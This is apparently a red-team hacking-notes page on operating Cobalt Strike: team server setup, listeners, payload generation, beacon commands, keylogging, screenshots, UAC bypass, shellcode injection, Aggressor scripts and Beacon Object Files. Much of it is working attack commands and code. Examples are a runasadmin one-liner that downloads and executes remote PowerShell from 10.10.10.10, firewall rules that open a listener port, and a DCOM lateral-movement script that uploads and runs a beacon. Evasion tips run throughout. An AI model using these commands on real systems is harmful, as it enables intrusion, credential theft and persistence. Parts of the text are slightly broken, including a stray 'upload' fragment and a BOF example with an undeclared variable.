title: C2 - Cobalt Strike
category: 00 - Red Team
order: 3
---

**Cobalt Strike** was one of the first public red team command and control frameworks.

Red Teamers and penetration testers use Cobalt Strike to demonstrate the risk of a breach and evaluate mature security programs.

Cobalt Strike is split into client and a server components. 

Check more info in the official documentation.

* [https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_main.htm](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/welcome_main.htm)

# Installation

```
sudo apt-add-repository 'deb http://security.debian.org/debian-security stretch/updates main'
sudo apt-get update
sudo apt-get install openjdk-11-jdk
sudo apt install proxychains socat
sudo update-alternatives --config java #Select openjdk-11
```

# Starting the Team Server

The server, referred to as the team server, is the controller for the Beacon payload and the host for Cobalt Strikeâ€™s social engineering features. The team server also stores data collected by Cobalt Strike and it manages logging.

The server run on a **supported Linux** systems. To start the team server, execute the following command:

```
./teamserver <IP> <Password> <Malleable C2 Profile>

[*] Generating X509 certificate and keystore (for SSL)
[+] Team server is up on 0.0.0.0:50050
[*] SHA256 hash of SSL cert is: eadd46ff4f74d582290ce1755513ddfc0ffd736f90bed5d8d662ee113faccb43
```
Once started we can launch the client and connect with the password used.

![](/hackingnotes/images/cobaltstrike-login.png)

Verify the server's fingerprint before connecting.

> **OPSEC Note:** The team server allows multiple clients to connect at the same time. If remote team members needs to connect, you shouldn't expose port 50050 directly to internet. Use a secure remote access solution such as SSH or VPN.

## Running as a Service

Running the team server as a service allows us to start it automatically when the server starts up.

First we need to create the following file `/etc/systemd/system/teamserver.service`:

```
[Unit]
Description=Cobalt Strike Team Server
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
WorkingDirectory=/home/user/cobaltstrike
ExecStart=/home/user/cobaltstrike/teamserver 10.10.10.10 password c2-profiles/normal/webbug.profile

[Install]
WantedBy=multi-user.target
```

Next, reload the systemd manager and check run teh service.

```
sudo systemctl daemon-reload
sudo systemctl start teamserver.service
```

Finally, the server should start on boot.

```
sudo systemctl enable teamserver.service
```

# Listeners

A listener is a host/port/protocol combination that listens for inconming communication from a beacon.

There are two types:

* **Egress**: Allow beacons to communicate outside of the target network to our team server.  The default egreess listener types are HTTP/S and DNS. These communications can be personalized such as bodies, headers, cookies, etc with the Malleable C2 Profile.

* **Peer-to-peer**: Allow beacons to chain their communications together over TCP or SMB. These are particularly useful in cases where a machine that you compromise can not reach the team server directly.

In order to create a listener go to `Cobalt Strike -> Listeners` and click the button `Add`.

![](/hackingnotes/images/cobaltstrike-listener.png)

## Egress Listeners

### HTTP/S

The HTTP listener allows beacon to send and receive C2 messages over HTTP GET and POST requests. 

### DNS

The DNS listener allows Beacon to send and receive C2 messages over several Lookup/Response types including A,AAAA and TXT.

TXT are used by default because they can hold the most amount of data. This requires to create one ore more DNS records for adomain that the team server will be authorative for.

Above an example:

| **Name** | **Type** |     **Data**    |
|:--------:|:--------:|:---------------:|
|     @    |     A    |   10.10.10.10   |
|    ns1   |     A    |   10.10.10.10   |
|   pics   |    NS    | ns1.example.com |


The DNS Beacon can then preform lookup requests, such as `<c2data>.pics.example.com`, which will be routed over the internet's DNS infrastructure.

After adding the beacon with the DNS Resolver `pics.example.com` we can check it:

```
$ dig @ns1.example.com test.pics.example.com +short
0.0.0.0
```

> **OPSEC Alert**: `0.0.0.0` is the default response, it can be changed in the Malleable C2 Profile.


## Peer-to-Peer (P2P) listeners

Peer-to-Peer (P2P) listeners allow Beacons to link their communications together to form a chain. The P2P types in Cobalt Strike are TCP and SMB.

Link beacon is specially useful when it comes to pivoting, and other situation where you need to spawn an additional beacon payload.

> **Note**: Help to keep the number of direct outbound connections.

We can create a P2P listener by selecting `Beacon SMB` or `Beacon TCP` payload.

If executing a P2P payload on a target manually, it won't appear in the UI until the `link` (for SMB Beacons) or `connect` (for TCP Beacons) command is used. You can also `unlink` P2P Beacons and then use `link` again from another Beacon to reorganise the chain.

Commands such as `spawn`, `spanwas`, `inject` and `jump` can be use with these payloads.

There are **no limit** of chain connections but if any of the middle beacons gets disconnected, all the child beacons would be disconnected, but we can `link` or `connect` another time.

### Beacon TCP

While creating the beacon we need to select the port where the target machine will listen and if we want that the target bind to localhost or in all interfaces.

![](/hackingnotes/images/cobaltstrike-listener-tcp-chain.png)

Once executed the payload for a `Beacon TCP` a listener will be launched waiting to a connection. In order to spawn the beacon we need to connect to it with the command `connect`.

Usage of command `connect`:
```
beacon> help connect
Use: connect [target]
     connect [target] [port]

Connect to a TCP Beacon and re-establish control of it. All requests for 
connected Beacon will go through this Beacon.

Use 'unlink' to disconnect from a TCP Beacon.
```
So we just need to select the host and the port.

```
beacon> connect 10.10.10.10 4444
```
After that a chain on beacons will be created.

![](/hackingnotes/images/cobaltstrike-listener-tcp-chain.png)

> **Note**: `Beacon TCP` binding in localhost are recommended to privilege escalations.

It may become necessary to open ports on the Windows Firewall to facilitate lateral movement.

* Add rule:

```
netsh advfirewall firewall add rule name="Allow 4444" dir=in action=allow protocol=TCP localport=4444
```
* Delete rule:

```
netsh advfirewall firewall delete rule name="Allow 4444" protocol=TCP localport=4444
```
### Beacon SMB

While creating the beacon we only need to select the pipename that will be used.

![](/hackingnotes/images/cobaltstrike-listener-p2p.png)

Same as TCP the beacon will listen to a connection. In that case we need to link pipenames with `link` command.

We can list them with:

```
ls \\.\pipe\
```

Usage of `link` command:

```
beacon> help link
Use: link [target] [pipe]
     link [target]

Connect to an SMB Beacon and re-establish control of it. All requests for 
connected Beacon will go through this Beacon. Specify an explicit [pipe]
to link to that pipename. The default pipe from the current profile is
used otherwise.
```

So we just have to select the target and the chosen pipename in the listener creation.

```
beacon> link 10.10.10.10 \\10.10.10.10\pipe\interprocess_28
```
We can also use `link` command again to reorganize the chain after getting disconnected.

> **Notes**: When moving laterally between targets, the SMB protocol is used extensively in a Windows environment, so this traffic blends in very well.


## Pivot Listeners

Pivot Listeners are another type of P2P listener that currently only uses `TCP`. It works in the opposite direction to the regular TCP listener.

When a beacon is spawned a Beacon payload that uses the TCP listener, that beacon acts as a TCP server and waits for an incoming connection from an existing beacon. Pivot Listeners are not created via the Listeners menu, but are bound to individual beacons.

This existing beacon will bind a port and listen for incoming connections acting as a TCP Server, and a Beacon payload that uses the pivot listener will act as the TCP client.

It is very usefull in scenarios where you don't know when the target will actually execute the payload and therefore when you need issue the `connect` command.

To start a Pivot Listener right-click on an existing Beacon and select `Pivoting->Listener`.

Once started, your selected port will be bound on that machine.

# Payloads

There are two types of payloads:

* **Staged**: Staged payloads are tiny, when executed the real shellcode is transfered and execute. 

* **Stageless**: It contains the whole shellcole which means is bigger than staged payloads.

> **OPSEC Note**: Staged payloads are useful when the delivery method is limited to an amount of data that we can send. However, they tend to have more indicators and is more detectable than stageless payloads.

Cobalt Strike can generate both staged and stageless payloads. On GUI if we see a `(S)` means that is *stageless*.

## Staged Payloads

Go to `Attacks -> Packages -> Windows Executable`:

![](/hackingnotes/images/cobaltstrike-staged.png)

## Stageless Payloads

Go to `Attacks -> Packages -> Windows Executable (S)`:

![](/hackingnotes/images/cobaltstrike-stageless.png)

> **OPSEC Note**: The use of 64-bit payloads on 64-bit Operating Systems is preferable to using 32-bit payloads on 64-bit Operating Systems.

    upload                    Upload a file
```

## Help <command>

We can also get help of a command with `help <command>`:

```
beacon> help sleep
Use: sleep [time in seconds] <jitter>

Change how often the beacon calls home. Use sleep 0 to force Beacon to call 
home many times each second. 

Specify a jitter value (0-99) to force Beacon to randomly modify its sleep time.
```

> **Note**: Parameters wrapped in `[ ]` are mandatory, whilst those in `< >` are optional although the default value maybe in not the best option.



## Sleep

With `sleep` command we can modify the time when the beacon checks into the team server, by default is setted to 60 seconds.

```
beacon> sleep 5
[*] Tasked beacon to sleep for 5s
[+] host called home, sent: 16 bytes
```

> **OPSEC Note**: Set a fast check-in can increase the chance of detection, it is also recommended to use a jitter which randomize the check-in time by a given percentage.

## File Management

There are some commands to interact with files.

```powershell
# List the file on the specified directory
beacon > ls <C:\Path>

# Change into the specified working directory
beacon > cd [directory]

# Delete a file\folder
beacon > rm [file\folder]

# File copy
beacon > cp [src] [dest]

# Download a file from the path on the Beacon host
beacon > download [C:\filePath]

# Lists downloads in progress
beacon > downloads

# Cancel a download currently in progress
beacon > cancel [*file*]

# Upload a file from the attacker to the current Beacon host
beacon > upload [/path/to/file]
```


## Execute Assembly

The `execute-assembly` command allows the beacon to run `.NET` executables directly from memory.

```
beacon> execute-assembly [/path/script.exe]  [arguments]
```

## PowerShell Commands

There are different ways to execute powershell commands on the beacon.

```powershell
# Import a Powershell .ps1 script from the control server and save it in memory in Beacon
beacon > powershell-import [/path/to/script.ps1]

# Setup a local TCP server bound to localhost and download the script imported from above using powershell.exe. Then the specified function and any arguments are executed and output is returned.
beacon > powershell [commandlet][arguments]

# Launch the given function using Unmanaged Powershell, which does not start powershell.exe. The program used is set by spawnto
beacon > powerpick [commandlet] [argument]

# Inject Unmanaged Powershell into a specific process and execute the specified command. This is useful for long-running Powershell jobs
beacon > psinject [pid][arch] [commandlet] [arguments]
```
## Shellcode Injection

It is possible to inject shellcode directly on a existent process. Its very useful when we need to spawn a listener of a different C2 or a meterpreter.

```
beacon> execute C:\Windows\System32\notepad.exe
beacon> ps

 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 1492  4268  notepad.exe                  x64   1           CORP\user

beacon> shinject 1492 x64 C:\Payloads\msf.bin
```

# Hosting Files

Cobalt Strike allows us to host files in his web server. Go to `Attacks -> Web Drive-by -> Host File`.


![](/hackingnotes/images/cobaltstrike-hostfile.png)


# Screenshots

We can retrieve important information doing screenshots of the user's desktop. We can retrieve shortcuts they have, what documents they're looking and so on.

Screenshots are stored in `View -> Screenshots`.

Beacon has multiple commands to take screenshots.

* **printscreen**: Take a single screenshot via PrintScr method.
```
beacon> printscreen
```

* **screenhost**: Take a single screenshot.
```
beacon> screenhost
```

* **screenwatch**: Take periodic screenshots.
```
beacon> screenwatch
```

# Keylogger

A keylogger can capture the keystrokes of a user, which is specially useful for capturing usernames, passwords and other sensitive data.

We can see the output of the keylogger in `View -> Keystrokes`.

```
beacon> keylogger
```

The keylogger runs as a job that can be stopped with the jobkill command.

```
beacon> jobs
[*] Jobs

 JID  PID   Description
 ---  ---   -----------
 1    0     keystroke logger

beacon> jobkill 1
```
# User Sessions

We can check which users are currently logged on the compromised machine.

```
beacon> net logons
```

# Bypass UAC

In cobalt strike there are two automatic ways to bypass UAC, with `elevate` and `runasadmin`.


## Elevate Command

`elevate` command has two exploits, using Service Control Manager or via token duplication.

```
beacon> elevate

Beacon Local Exploits
=====================

    Exploit                         Description
    -------                         -----------
    cve-2020-0796                   SMBv3 Compression Buffer Overflow (SMBGhost) (CVE 2020-0796)
    ms14-058                        TrackPopupMenu Win32k NULL Pointer Dereference (CVE-2014-4113)
    ms15-051                        Windows ClientCopyImage Win32k Exploit (CVE 2015-1701)
    ms16-016                        mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051)
    svc-exe                         Get SYSTEM via an executable run as a service
    uac-schtasks                    Bypass UAC with schtasks.exe (via SilentCleanup)
    uac-token-duplication           Bypass UAC with Token Duplication
```

Not all UAC bypasses are created equal, and does not have same `TokenPrivileges`.

### svc-exe

```
beacon> elevate svc-exe tcp-4444
Started service 96d2381 on .
[+] established link to child beacon: 10.10.10.10
```
> **Note**: The beacon obtained with `svc-exe` bypass will have the necessary token privileges to run post-ex commands such as `logonpasswords`.

### uac-schtasks

Similar to `svc-exe`.

```
beacon> elevate uac-schtasks tcp-4444
[*] Tasked Beacon to run windows/beacon_bind_tcp (127.0.0.1:4444) in a high integrity context
[+] established link to child beacon: 10.10.10.10
```

### uac-token-duplication

```
beacon> elevate uac-token-duplication tcp-4444
Started service 96d2381 on .
[+] established link to child beacon: 10.10.10.10
```
> **Note**: The beacon obtained with `uac-token-duplicatio` bypass is limited and some post-ex command such as `logonpasswords` will fail due to the lack of some TokenPrivileges.

## Runasadmin Command

With `runasadmin` command we can execute a high privilege command. Like `elevate` has some exploits.


```
beacon> runasadmin

Beacon Command Elevators
========================

    Exploit                         Description
    -------                         -----------
    uac-cmstplua                    Bypass UAC with CMSTPLUA COM interface
    uac-token-duplication           Bypass UAC with Token Duplication
```

Example:

```
beacon> runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.10.10/b'))"
```

# Headless Colbalt Strike

When the team server starts the listeners we had running are started, but any hosted files we had, this could be a problem during persistence mechanisms.

We can use a headless Cobalt strike client via the `agscript` utility, to execute an agressor script on start up.

```
agscript [host] [port] [user] [password]
```

Create a `host_payloads.cna` with the follwoing content:

```
# Connected and ready
on ready {

    # Generate payload
    $payload = artifact_payload("http", "powershell", "x64");

    # Host payload
    site_host("10.10.10.10", 80, "/a", $payload, "text/plain", "Auto Web Delivery (PowerShell)", false);

}
```

You can test the script with:

```
agscript 127.0.0.1 50050 headless password host_payloads.cna
```

Finally add this to our existing startup service.

```
ExecStartPost=/bin/sh -c '/usr/bin/sleep 30; /home/user/cobaltstrike/agscript 127.0.0.1 50050 headless password host_payloads.cna &'
```

# Aggressor Scripts

The `.cna` files that we load into the Cobalt Strike Script Manager are called Aggressor Scripts. These can override default behaviours in Cobalt Strike to customise the UI (add new menus, commands, etc), extended the data models, extended existing commands like jump, and add brand new, custom commands. Aggressor Scripts are programmed with **Sleep language**.

* Documentation: [https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/agressor_script.htm](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/agressor_script.htm)
* Sleep: [http://sleep.dashnine.org/manual/index.html](http://sleep.dashnine.org/manual/index.html)

## Adding INVOKE_DCOM to JUMP and REMOTE-EXEC commands

Aggressor can be used to register new techniques under `jump` and `remote-exec` using [https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#beacon_remote_exploit_register](beacon_remote_exploit_register) and [https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#beacon_remote_exec_method_register](beacon_remote_exec_method_register) respectively.

We are going to integrate `Invoke-DCOM.ps1` into `jump` command. First we need to create a `dcom.cna` template file.

```c
sub invoke_dcom
{

}

beacon_remote_exploit_register("dcom", "x64", "Use DCOM to run a Beacon payload", &invoke_dcom);
```

This will register `dcom` as a new option inside the `jump` command and specifies `invoke_dcom` as the associated callback function. We also need to declare local variables

```c
sub invoke_dcom
{
    local('$handle $script $oneliner $payload');
}

beacon_remote_exploit_register("dcom", "x64", "Use DCOM to run a Beacon payload", &invoke_dcom);
```

`local` defines variables that are local to the current function, so they will disappear once executeed.

> **Note**: Sleep language have `global`, `closure-specific` and `local` scopes for variable declaration.

The next step is to acknowledge receipt of the task using `btask`.  This takes the ID of the Beacon, the text to post and an ATT&CK tactic ID.  This will print a message to the Beacon console and add it to the data model used in the activity and session reports that you can generate from Cobalt Strike.

```c
sub invoke_dcom
{
    local('$handle $script $oneliner $payload');

    # acknowledge this command
    btask($1, "Tasked Beacon to run " . listener_describe($3) . " on $2 via DCOM", "T1021");
}
```

In that case:

* `$1` is the Beacon ID.
* `$2` is the target to jump.
* `$3` is the selected listener.

Next we want to read in the `Invoke-DCOM.ps1` script from our machine. This can be done with `openf`, `getFileProper` and `script_resource`.

```c
# read the script
$handle = openf(getFileProper("C:\\Tools", "Invoke-DCOM.ps1"));
$script = readb($handle, -1);
closef($handle);
```

At this moment `$script` has the content of `Invoke-DCOM.ps1`. We can use [https://download.cobaltstrike.com/aggressor-script/functions.html#beacon_host_script](beacon_host_script), this will host the script inside Beacon and returns a short snippet for running it.

```c
# host the script in Beacon
$oneliner = beacon_host_script($1, $script);
```

> **Note**: We can use `println($oneliner)` to see the content of variables. We can check in the Script Console `Cobalt Strike -> Script Console`.

Next step is to generate and upload a paylaod to the target using [https://download.cobaltstrike.com/aggressor-script/functions.html#artifact_payload](artifact_payload) and [https://download.cobaltstrike.com/aggressor-script/functions.html#bupload_raw](bupload_raw). These functions will generate an EXE payload and will upload it to the target directory.

```c
# generate stageless payload
$payload = artifact_payload($3, "exe", "x64");

# upload to the target
bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\beacon.exe", $payload);
```

> **Note**: `$+` is used for concat strings (Blank spaces are needed).

Finally [https://download.cobaltstrike.com/aggressor-script/functions.html#bpowerpick](bpowerpick) can execute the `Invoke-DCOM` oneliner. We need to pass it the target computer name and the path to the uploaded payload. Also beacuse, this could be a P2P payload and we want to automatically try and link to it, which can be done with [https://download.cobaltstrike.com/aggressor-script/functions.html#beacon_link](beacon_link).

```c
# run via powerpick
bpowerpick!($1, "Invoke-DCOM -ComputerName $+ $2 $+ -Method MMC20.Application -Command C:\\Windows\\Temp\\beacon.exe", $oneliner);

# link if p2p beacon
beacon_link($1, $2, $3);
```

The complete script:

```c
sub invoke_dcom
{
    local('$handle $script $oneliner $payload');

    # acknowledge this command1
    btask($1, "Tasked Beacon to run " . listener_describe($3) . " on $2 via DCOM", "T1021");

    # read in the script
    $handle = openf(getFileProper("C:\\Tools", "Invoke-DCOM.ps1"));
    $script = readb($handle, -1);
    closef($handle);

    # host the script in Beacon
    $oneliner = beacon_host_script($1, $script);

    # generate stageless payload
    $payload = artifact_payload($3, "exe", "x64");

    # upload to the target
    bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\beacon.exe", $payload);

    # run via powerpick
    bpowerpick!($1, "Invoke-DCOM -ComputerName  $+  $2  $+  -Method MMC20.Application -Command C:\\Windows\\Temp\\beacon.exe", $oneliner);

    # link if p2p beacon
    beacon_link($1, $2, $3);
}

beacon_remote_exploit_register("dcom", "x64", "Use DCOM to run a Beacon payload", &invoke_dcom);
```

# Beacon Object Files

Beacon Object Files (BOFs) are a post-ex capability that allows for code execution inside the Beacon host process. The main advantage is to avoid the `fork & run` pattern that commands such as `powershell`, `powerpick` and `execute-assembly` rely on. Since these spawn a sacrificial process and use process injection to run the post-ex action, they are heavily scrutinised by AV and EDR products.

BOFs are COFF objects writtent in C or C++ on which beacons acts as a linker and loader. Beacon does not link BOFs to a standard C library, so many common functions are not available. However, beacon does expose several internal APIs that can be used to simplify some actions such as argument parsing and hangling output.

We can download the `beacon.h` library on the follwing link.

* [https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/beacon.h](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/beacon.h)

## Example on inline-execute

An example of a basic BOF which sends `Hello World!! :)` as output is:

```c
#include <windows.h>
#include "beacon.h"

void go(char * args, int len)
{
    BeaconPrintf(CALLBACK_OUTPUT, "Hello World!! :)");
}
```

We need to compile it in windows or linux:

* Windows:

```
cl.exe /c /GS- hello-world.c /hello-world.o
```

* Linux:

```
x86_64-w64-mingw32-gcc -c hello-world.c -o hello-world.o
```

Finally we can execute it with the command `inline-execute`.

```
beacon> inline-execute C:\Windows\Temp\hello-world.o
```

> **Note**: The built-in `inline-execute` commands expects that the entry point of the BOF is called `go`.


## Handling Arguments

Sometimes we need to pass arguments to a BOF. A typicall console application may looks like `main(int argc, char *argv[])` but BOF uses `go(char * args, int len)`.

These arguments are packed into a special binary format using the `bof_pack` aggressor function and can be unpacked using Beacons APIs exported via `beacon.h`.

First we need to call `BeaconDataParse` to nitialise the parser and then `BeaconDataExtract` to extract the argument.

```c
void go(char * args, int len)
{
    datap parser;
    BeaconDataParse(&parser, args, len);

    char * var1;
    username = BeaconDataExtract(&parser, NULL);

    BeaconPrintf(CALLBACK_OUTPUT, "The VARIABLE 1 is: %s", var1);
}
```

If we need to pass more than one argument, we need to unpack them in the same order they were packed.

```c
char * var1;
char * var2;

var1 = BeaconDataExtract(&parser, NULL);
var2 = BeaconDataExtract(&parser, NULL);
```

We may also want to extract integers, we can do it with `BeaconDataInt`.

```c
int number;
number = BeaconDataInt(&parser);
```

## Calling Win32 APIs

APIs such as LoadLibrary and GetProcAddress are available from a BOF, which can be used to resolve and call other APIs at runtime. 

BOFs provice a convention called Dynamic Function Resolution (DFR) which allows beacons to perform the necessary resolution for you.

Example of definition of a DFR (MessageBoxW):

```c
DECLSPEC_IMPORT INT WINAPI USER32$MessageBoxW(HWND, LPCWSTR, LPCWSTR, UINT);
```

We can find the information on the documentation:

* [https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messageboxw](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messageboxw)

```c
#include <windows.h>
#include "beacon.h"

void go(char * args, int len)
{
    DECLSPEC_IMPORT INT WINAPI USER32$MessageBoxW(HWND, LPCWSTR, LPCWSTR, UINT);

    datap parser;
    BeaconDataParse(&parser, args, len);

    wchar_t * message;
    message = (wchar_t *)BeaconDataExtract(&parser, NULL);

    USER32$MessageBoxW(NULL, message, L"Message Box", 0);
}
```

## Implementation with Aggressor

We can implement our BOF with Aggressor by registering custom aliases and commands.

```
alias hello-world {
    local('$handle $bof $args');
    
    # read the bof file (assuming x64 only)
    $handle = openf(script_resource("hello-world.o"));
    $bof = readb($handle, -1);
    closef($handle);
    
    # print task to console
    btask($1, "Running Hello World BOF");
    
    # execute bof
    beacon_inline_execute($1, $bof, "go");
}

# register a custom command
beacon_command_register("hello-world", "Execute Hello World BOF", "Loads hello-world.o and calls the \"go\" entry point.");
```

Arguments passed on the CS GUI command line are separated by whitespace. The first argument will be `$1` is always the current beacon, then `$2`, `$3`... are our input. We can pack the arguments we want to send in our agressor script.

These arguments are packed into a special binary format using the `bof_pack` aggressor function and can be unpacked using Beacons APIs exported via `beacon.h`.

```
$args = bof_pack($1, "z", $2);
```
`"z"` tells Cobalt Strike what format of data this is, where `z` represents a zero-terminated and encoded string.

Cobalt Strike Data formats:

| **Format** |          **Description**         |     **Unpack Function**     |
|:----------:|:--------------------------------:|:---------------------------:|
|      b     |            Binary Data           |      BeaconDataExtract      |
|      i     |       4-byte integer (int)       |        BeaconDataInt        |
|      s     |      2-byte integer (short)      |       BeaconDataShort       |
|      z     | zero-terminated + encoded string |      BeaconDataExtract      |
|      Z     |    zero-terminated wide string   | (wchar_t*)BeaconDataExtract |

Multiple arguments should be packed at the same time.

```c
// pack 2 strings
$args = bof_pack($1, "zz", "str1", "str2");

// pack a string and an int
$args = bof_pack($1, "zi", "str1", 123);
```
